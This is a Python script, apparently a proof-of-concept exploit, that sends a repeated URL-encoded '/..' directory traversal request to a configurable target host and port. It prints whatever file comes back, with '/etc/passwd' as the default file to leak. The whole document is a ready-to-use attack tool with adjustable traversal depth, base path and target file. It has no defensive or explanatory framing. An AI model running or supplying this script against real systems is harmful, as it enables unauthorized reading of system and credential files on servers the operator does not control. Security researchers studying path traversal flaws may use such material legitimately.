import argparse
import logging
import os
import urllib.parse

import requests

from typing import Optional
from requests import Response

logger = logging.getLogger(__name__)


def main(args) -> None:
    origin = f"http://{args.host}:{args.port}"
    traversal: str = urllib.parse.quote_plus("/..") * args.traversal_count

    logger.info(f"Reading '{args.path}' from '{origin}'")

    response: Optional[Response] = None
    try:
        response = requests.get(origin + args.base + traversal + args.path)
    except Exception as e:
        logger.error(e)
        return

    if response:
        print(response.text)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    logging.addLevelName(logging.INFO, "*")
    logging.addLevelName(logging.WARN, "!")
    logging.addLevelName(logging.ERROR, "-")

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--host",
        "-H",
        default=os.getenv("TARGET_HOST", "localhost"),
        help="Target host",
    )
    parser.add_argument(
        "--port",
        "-P",
        default=int(os.getenv("TARGET_PORT", 4507)),
        type=int,
        help="Target port",
    )
    parser.add_argument("--base", "-b", default="/", help="Base directory of endpoint")
    parser.add_argument("--path", "-p", default="/etc/passwd", help="File path to leak")
    parser.add_argument(
        "--traversal-count", "-c", default=8, type=int, help="Number of traversal"
    )

    main(parser.parse_args())
